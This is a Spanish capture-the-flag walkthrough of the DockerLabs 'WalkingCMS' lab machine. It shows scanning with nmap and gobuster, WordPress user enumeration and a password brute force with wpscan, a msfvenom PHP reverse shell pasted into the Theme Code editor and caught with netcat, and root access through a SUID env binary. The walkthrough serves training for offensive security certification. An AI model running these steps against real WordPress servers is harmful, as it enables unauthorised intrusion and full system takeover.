# WalkingCMS DockerLabs

***

## 1 - Reconocimiento

#### P1 - Verificar conectividad

```Shell
ping -c 1 172.17.0.2
```

<figure><img src="../.gitbook/assets/WalkingCMS - ping.jpg" alt=""><figcaption></figcaption></figure>

#### P2 - Escaneo de puertos con nmap

```Shell
nmap -p- --open --min-rate=5000 -n -Pn 172.17.0.2
```

<figure><img src="../.gitbook/assets/WalkingCMS - nmap.jpg" alt=""><figcaption></figcaption></figure>

## 2 - Enumeración

#### P1 - Scripts basicos de reconocimiento y versiones de los servicios

```Shell
nmap -sCV -p80 172.17.0.2
```

<figure><img src="../.gitbook/assets/WalkingCMS - -sCV.jpg" alt=""><figcaption></figcaption></figure>

> Vemos que tenemos el puerto 80 (http) expuesto, veamos que hay en la pagina web

<figure><img src="../.gitbook/assets/Trust - Pagina web.jpg" alt=""><figcaption></figcaption></figure>

> Nos encontramos con la pagina web por defecto de apache2, esto nos dice que es un servidor web apache2 recien instalado, como no hay nada en la pagina raiz veamos que hay en los demas directorios

```Shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.php,.py,.sh,.html
```

> En este caso he usado gobuster para la enumeración de directorios, pero tambien podrias usar otra herramienta como dirbuster que es la recomendada por INE para la EJPTv2

<figure><img src="../.gitbook/assets/WalkingCMS - gobuster.jpg" alt=""><figcaption></figcaption></figure>

> Entre los directorios encontrados el que mas nos llama la atencion es /wordpress ya que nos indica contra que nos estamos enfrentando

<figure><img src="../.gitbook/assets/WalkingCMS - Revision de wordpress.jpg" alt=""><figcaption></figcaption></figure>

> Hagamos otra enumeración de directorios con gobuster pero esta vez al directorio /wordpress/

```Shell
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.php,.py,.sh,.html
```

<figure><img src="../.gitbook/assets/WalkingCMS - segundo gobuster (1).jpg" alt=""><figcaption></figcaption></figure>

> Ahora que hemos encontrado rutas mas interesantes, podemos empezar con la enumeración de plugins vulnerables, usuarios

#### P2 - Enumeración de usuarios y plugins vulnerables

```Shell
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp
```

<figure><img src="../.gitbook/assets/WalkingCMS - usuario.jpg" alt=""><figcaption></figcaption></figure>

> Vemos que wpscan nos encontró un usuario llamado mario, en el siguiente paso probaremos a hacer un ataque de fuerza bruta con wpscan

## 3 - Explotación

#### P1 - Fuerza bruta al usuario mario

```Shell
wpscan --url http://172.17.0.2/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames mario
```

<figure><img src="../.gitbook/assets/WalkingCMS - fuerza bruta.jpg" alt=""><figcaption></figcaption></figure>

> Wpscan encontró la contraseña love para el usuario mario, probemos a entrar desde el panel de wp-login que encontramos anteriormente con gobuster

<figure><img src="../.gitbook/assets/WalkingCMS - correo.jpg" alt=""><figcaption></figcaption></figure>

> El usuario y la contraseña parecen ser correctos, pero nos piden que verifiquemos si el correo es correcto, si le damos a cualquiera de las 3 opciones nos dejara iniciar sesion como el usuario mario

<figure><img src="../.gitbook/assets/WalkingCMS - logeados.jpg" alt=""><figcaption></figcaption></figure>

> Si echamos un vistazo a la pagina nos daremos cuenta que en el apartado de apariencia hay una sección que se llama 'Theme code editor' que nos deja insertar codigo, subir archivos etc.

<figure><img src="../.gitbook/assets/WalkingCMs - Theme code editor.jpg" alt=""><figcaption></figcaption></figure>

#### P2 - Creacion de archivos maliciosos con msfvenom

> Dentro de msfconsole podemos buscar payloads con el comando --list payloads

```Shell
msfvenom --list payloads | grep "php"
```

<figure><img src="../.gitbook/assets/WalkingCMS - reverse shell.jpg" alt=""><figcaption></figcaption></figure>

> En este caso usaremos el payload php/reverse\_php, para la creacion de el archivo malicioso tendremos q indicar nuestra ip y el puerto en el que nos pondremos en escucha con netcat

<figure><img src="../.gitbook/assets/WalkingCMS - msfvenoom.jpg" alt=""><figcaption></figcaption></figure>

#### P3 - Insertar el codigo malicioso a wordpress

> Copiamos el codigo de el archivo malicioso creado con msfvenom y lo pegamos en el campo de texto de index.php dentro de Theme Code editor (hay que borrar el codigo que viene por defecto)

```Shell
cat archivo.php | xclip -selection clipboard
```

<figure><img src="../.gitbook/assets/WalkingCMS - codigo subido.jpg" alt=""><figcaption></figcaption></figure>

> Ahora que ya hemos subido la reverse shell, solo queda entrar a la ruta donde la hemos subido: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/ , nos ponemos en escucha con netcat por el puerto 8888 y ya estaremos dentro de la maquina victima

<figure><img src="../.gitbook/assets/WalkingCMS - ruta revshell.jpg" alt=""><figcaption></figcaption></figure>

```Shell
nc -nlvp 8888
```

<figure><img src="../.gitbook/assets/WalkingCMS - Estamos dentro.jpg" alt=""><figcaption></figcaption></figure>

## 4 - Escalada de privilegios

#### P1 - Tratamineto de la TTY

```Shell
1  script /dev/null -c bash

2 Ctrl + Z 

3 stty raw -echo;fg

4 reset xterm
```

#### P2 - Busqueda de binarios suid

```Shell
find / -perm -4000 2>/dev/null
```

<figure><img src="../.gitbook/assets/WalkingCMS - escalada.jpg" alt=""><figcaption></figcaption></figure>

> Aquí localizamos que el binario env tiene estos permisos, lo cual es algo extraño, vamos a aprovecharnos de este binario para convertirnos en root

```Shell
/usr/bin/env /bin/bash -p
```

> Ya somos root

***
